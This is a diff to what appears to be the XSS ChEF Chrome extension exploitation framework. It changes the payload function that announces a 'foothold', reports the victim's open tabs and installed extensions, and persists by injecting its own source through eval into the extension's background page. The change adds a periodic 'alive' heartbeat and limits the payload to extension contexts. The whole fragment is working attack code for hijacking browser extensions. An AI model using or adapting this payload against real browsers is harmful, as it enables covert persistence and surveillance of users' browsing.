@@ -228,12 +228,17 @@ function __xsschef() {
         log('foothold started');
         report_tabs();
         report_ext();
+        setInterval(function() {
+            log('alive');
+        }, 20000);
     }
 };
 
-if (chrome.extension.getBackgroundPage()) {// try to persist in background page
-    // chrome 18 csp fix - maybe add script to document.body? 
-    chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
-} else {
-    __xsschef(); // no persistence :(
+if (location.protocol == 'chrome-extension') { // evaluate only in extension code
+    if (chrome.extension.getBackgroundPage()) {// try to persist in background page
+        // chrome 18 csp fix - maybe add script to document.body? 
+        chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
+    } else {
+        __xsschef(); // no persistence :(
+    }
 }
